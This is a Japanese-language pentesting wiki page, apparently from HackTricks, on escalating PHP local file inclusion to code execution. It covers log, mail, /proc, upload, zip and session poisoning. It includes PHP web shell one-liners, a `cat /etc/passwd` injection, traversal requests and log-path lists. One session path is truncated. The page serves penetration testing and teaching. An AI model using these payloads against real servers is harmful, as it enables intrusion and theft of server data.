ApacheまたはNginxサーバーがinclude関数内で**LFIに対して脆弱**である場合、**`/var/log/apache2/access.log`または`/var/log/nginx/access.log`**にアクセスし、**ユーザーエージェント**または**GETパラメータ**内に**`<?php system($_GET['c']); ?>`**のようなPHPシェルを設定して、そのファイルをインクルードすることができます。

{% hint style="warning" %}
シェルには**シングルクォート**ではなく**ダブルクォート**を使用すると、ダブルクォートは文字列"_**quote;**_"に変更され、**PHPはエラーをスロー**し、他の処理は実行されません。

また、ペイロードを**正しく記述**することを確認してください。そうしないと、ログファイルの読み込みを試みるたびにPHPがエラーを発生させ、二度目の機会はありません。
{% endhint %}

これは他のログでも行うことができますが、ログ内のコードはURLエンコードされている可能性があるため、これによってシェルが破壊される可能性があります。ヘッダーの**authorisation "basic"**にはBase64で"user:password"が含まれており、ログ内でデコードされます。PHPシェルはこのヘッダー内に挿入される可能性があります。

他の可能なログパス:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### メール経由

内部アカウント（user@localhost）にPHPのペイロード（`<?php echo system($_REQUEST["cmd"]); ?>`）を含むメールを送信し、**`/var/mail/<USERNAME>`**または**`/var/spool/mail/<USERNAME>`**のパスでユーザーのメールをインクルードしようとしてください。

### /proc/\*/fd/\*を介して

1. シェルをたくさんアップロードします（例：100個）
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD)をインクルードします。ここで、$PIDはプロセスのPID（ブルートフォースで見つけることができます）であり、$FDはファイルディスクリプタ（これもブルートフォースで見つけることができます）です。

### /proc/self/environを介して

ログファイルのように、User-Agentでペイロードを送信します。これは/proc/self/environファイル内に反映されます。
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### アップロード経由

ファイルをアップロードできる場合は、シェルのペイロードを注入します（例：`<?php system($_GET['c']); ?>`）。
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
ファイルを読みやすく保つために、写真/ドキュメント/PDFのメタデータにインジェクトするのが最適です。

### Zipファイルのアップロード経由

PHPシェルが圧縮されたZIPファイルをアップロードし、アクセスします。
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHPセッションを介して

ウェブサイトがPHPセッション（PHPSESSID）を使用しているかどうかを確認します。
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHPでは、これらのセッションは_/var/lib/php5/sess\\_\[PHPSESSID]\_ファイルに保存されます。
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
クッキーを `<?php system('cat /etc/passwd');?>` に設定します。
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
# ファイルインクルージョン（LFI）を使用してPHPセッションファイルをインクルードする

LFI（ファイルインクルージョン）は、ウェブアプリケーションのセキュリティ上の脆弱性の一つであり、攻撃者がサーバー上のファイルを読み込むことができる可能性があります。このテクニックを使用して、PHPセッションファイルをインクルードすることができます。

以下の手順を実行して、LFIを使用してPHPセッションファイルをインクルードします。

1. ターゲットのウェブアプリケーションにアクセスします。
2. LFIの脆弱性を見つけるために、ウェブアプリケーションのURLに特定のパラメータを追加します。例えば、`http://example.com/page.php?file=home`のような形式です。
3. パラメータの値に、攻撃者が読み込みたいPHPセッションファイルのパスを指定します。例えば、`http://example.com/page.php?file=/var/lib/php/sessions/sess_1234567890`のような形式です。
4. ウェブアプリケーションがLFIの脆弱性を持っている場合、攻撃者は指定したパスのPHPセッションファイルを読み込むことができます。

LFIを使用してPHPセッションファイルをインクルードすることで、攻撃者はセッションデータを盗み出すことができます。この情報を利用すると、攻撃者はセッションハイジャックや他の攻撃を行うことができます。セキュリティ上のリスクを最小限に抑えるために、ウェブアプリケーションの開発者はLFIの脆弱性を修正する必要があります。
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### SSHを介して

sshがアクティブな場合、使用されているユーザー（/proc/self/statusおよび/etc/passwd）を確認し、**\<HOME>/.ssh/id\_rsa**にアクセスを試みます。

### vsftpdログを介して

このFTPサーバーのログは_var/log/vsftpd.log_に保存されます。LFIがあり、公開されたvsftpdサーバーにアクセスできる場合、ユーザー名にPHPペイロードを設定してログインし、LFIを使用してログにアクセスできます。

### phpフィルターを介して（ファイルは不要）

この[解説](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)では、**phpフィルターを使用して任意のコンテンツを生成**できることが説明されています。これは基本的には、ファイルに書き込む必要なく、インクルードのための**任意のphpコードを生成**できることを意味します。

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### セグメンテーションフォールトを介して

一時的に/tmpに保存されるファイルを**アップロード**し、**同じリクエスト**で**セグメンテーションフォールト**をトリガーし、**一時ファイルが削除されない**ようにし、それを検索できます。

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Nginx一時ファイルストレージを介して

**ローカルファイルインクルージョン**が見つかり、**Nginx**がPHPの前で実行されている場合、次のテクニックを使用してRCEを取得できる場合があります。

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### PHP\_SESSION\_UPLOAD\_PROGRESSを介して

**ローカルファイルインクルージョン**が見つかった場合、セッションがなく、`session.auto_start`が`Off`であっても、**`PHP_SESSION_UPLOAD_PROGRESS`**を**マルチパートPOST**データで提供すると、PHPはセッションを**有効にします**。これを悪用してRCEを取得できます。

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Windowsでの一時ファイルアップロードを介して

**ローカルファイルインクルージョン**が見つかり、サーバーが**Windows**で実行されている場合、RCEを取得できる場合があります。

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### phpinfo()（file\_uploads = on）を介して

**ローカルファイルインクルージョン**が見つかり、file\_uploads = onで**phpinfo()**を公開するファイルがある場合、RCEを取得できます。

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + パスの開示を介して

**ローカルファイルインクルージョン**が見つかり、一時ファイルのパスを**外部に漏洩**できるが、**サーバー**が**インクルードするファイルにPHPマークがあるかどうかをチェック**している場合、次の**競合状態**を使用してそのチェックを**バイパス**できます。

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### 永遠の待機+ブルートフォースを介して

LFIを悪用して**一時ファイルをアップロード**し、サーバーのPHP実行を**停止**させることができれば、**数時間にわたってファイル名をブルートフォース**して一時ファイルを見つけることができます。

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### 致命的なエラーへ

`/usr/bin/phar`、`/usr/bin/phar7`、`/usr/bin/phar.phar7`、`/usr/bin/phar.phar`のいずれかのファイルをインクルードします（同じものを2回インクルードする必要があります）。

**これがどのように有用かはわかりませんが、有用かもしれません。**\
_PHP Fatal Errorを引き起こしても、アップロードされたPHP一時ファイルは削除されます。_

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## 参考文献

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/en-local-file-inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてさらに学びましょう**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグバウンティについて通知を受ける

💬 コミュニティディスカッションに参加する

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ HackTricksで**会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを発見してください。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)に参加するか、[Telegramグループ](https://t.me/peass)に参加するか、[Twitter](https://twitter.com/hacktricks_live)で私をフォローしてください[🐦](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[@carlospolopm](https://twitter.com/hacktricks\_live)。

* ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。
